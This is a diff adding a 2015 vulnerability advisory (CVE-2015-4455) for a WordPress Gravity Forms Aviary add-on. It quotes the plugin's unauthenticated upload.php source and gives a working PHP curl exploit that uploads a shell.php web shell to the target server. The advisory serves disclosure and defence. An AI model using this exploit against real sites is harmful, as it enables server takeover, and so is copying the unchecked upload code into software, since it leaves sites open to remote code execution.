@@ -1,0 +1,87 @@
+Title: Remote file upload vulnerability in aviary-image-editor-add-on-for-gravity-forms v3.0beta Wordpress plugin
+Author: Larry W. Cashdollar, @_larry0
+Date: 2015-06-07
+Download Site: https://wordpress.org/plugins/aviary-image-editor-add-on-for-gravity-forms
+Vendor: Waters Edge Web Design and NetherWorks LLC
+Vendor Notified: 2015-06-08
+Advisory: http://www.vapid.dhs.org/advisory.php?v=125
+Vendor Contact: plugins@wordpress.org
+Description: A plugin that integrates the awesome Adobe Creative SDK (formerly Aviary) Photo / Image Editor with the Gravity Forms Plugin.
+Vulnerability:
+There is a remote file upload vulnerability in aviary-image-editor-add-on-for-gravity-forms/includes/upload.php as an unauthenticated user can upload any file to the system.  Including a .php file.  The upload.php doesn't check that the user is authenticated and a simple post will allow arbitrary code to be uploaded to the server.
+
+In the file aviary-image-editor-add-on-for-gravity-forms/includes/upload.php the code doesn’t check for an authenticated Wordpress user:
+
+1 <?php
+2 
+3 $filename = $_SERVER["DOCUMENT_ROOT"]."/wp-load.php";
+4 if (file_exists($filename)) {
+5     include_once($filename);
+6 } else {
+7     include_once("../../../../wp-load.php");
+8 }
+9 echo "Here";
+10 $image_file = $_FILES['gf_aviary_file'];
+11 if($image_file['name']!=''){
+12      $max_file_size =  4*1024*1024;
+13      $file_size = intval($image_file['size']);
+14      if( $file_size > $max_file_size ){
+15          $msg = "File Size is too big.";
+16          $error_flag = true;
+17      }
+18      $extension = strtolower(end(explode('.', $image_file['name'])));
+19      $aa_options = get_option('gf_aa_options');
+20      $supported_files = $aa_options['supported_file_format'];
+21      $supported_files = strtolower($supported_files);
+22      if(!$error_flag && $supported_files != '' ){
+23        $supported_files = explode (',', $supported_files);
+24        if(!in_array($extension, $supported_files)){
+25           $msg = "No Supported file.";
+26           $error_flag = true;
+27        }
+28      }
+29      if(!$error_flag){
+30         $wp_upload_dir = wp_upload_dir();
+31         if(!is_dir($wp_upload_dir['basedir'].'/gform_aviary')){
+32              mkdir($wp_upload_dir['basedir'].'/gform_aviary');
+33         }
+34         $upload_dir = $wp_upload_dir['basedir'].'/gform_aviary/';
+35         $upload_url = $wp_upload_dir['baseurl'].'/gform_aviary/';
+36         $file_name = $upload_dir.$_POST['gf_aviary_field_id'].'_'.$image_file['name'    ];
+37         if(move_uploaded_file($image_file['tmp_name'], $file_name)){
+38             $file_url = $upload_url.$_POST['gf_aviary_field_id'].'_'.$image_file['na    me'];
+39         }
+40     }
+41     $return_obj = array('status' => 'success', 'message' => $file_url);
+42     echo json_encode($return_obj);
+43  }
+44 ?>
+
+CVEID: 2015-4455
+OSVDB:
+Exploit Code:
+<?php
+/*Remote shell upload exploit for aviary-image-editor-add-on-for-gravity-forms v3.0beta */
+/*Larry W. Cashdollar @_larry0
+6/7/2015
+shell will be located http://www.vapidlabs.com/wp-content/uploads/gform_aviary/_shell.php
+*/
+
+
+    $target_url = 'http://server/wp-content/plugins/aviary-image-editor-add-on-for-gravity-forms/includes/upload.php';
+    $file_name_with_full_path = '/var/www/shell.php';
+
+    echo "POST to $target_url $file_name_with_full_path";
+    $post = array('name' => 'shell.php','gf_aviary_file'=>'@'.$file_name_with_full_path);
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL,$target_url);
+    curl_setopt($ch, CURLOPT_POST,1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
+    $result=curl_exec ($ch);
+    curl_close ($ch);
+    echo "<hr>";
+    echo $result;
+    echo "<hr>";
+?>
